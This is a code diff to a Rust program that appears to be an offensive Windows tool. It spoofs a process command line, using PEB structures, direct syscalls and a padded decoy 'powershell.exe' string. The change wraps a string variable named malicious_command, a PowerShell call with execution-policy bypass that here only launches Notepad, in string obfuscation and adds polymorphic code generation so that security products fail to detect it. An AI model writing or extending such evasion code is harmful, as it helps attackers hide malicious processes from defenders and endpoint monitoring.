@@ -1,9 +1,10 @@
 #![allow(non_snake_case)]
+mod obf;
 mod syscalls;
 use crate::syscalls::SYSCALLS;
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
-use rustpolymorphic::polymorph;
+use rustpolymorphic::{polymorph, obf_str};
 use std::ffi::c_void;
 use windows_sys::Win32::System::Threading::{
     CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
@@ -26,8 +27,8 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 #[polymorph(fn_len = 10, garbage = true)]
 fn main() {
-    let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
-    let malicious_command_wide = to_wide_chars(malicious_command);
+    let malicious_command = obf_str!("powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"");
+    let malicious_command_wide = to_wide_chars(&malicious_command);
 
     let spoofed_command_str = "powershell.exe";
     let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
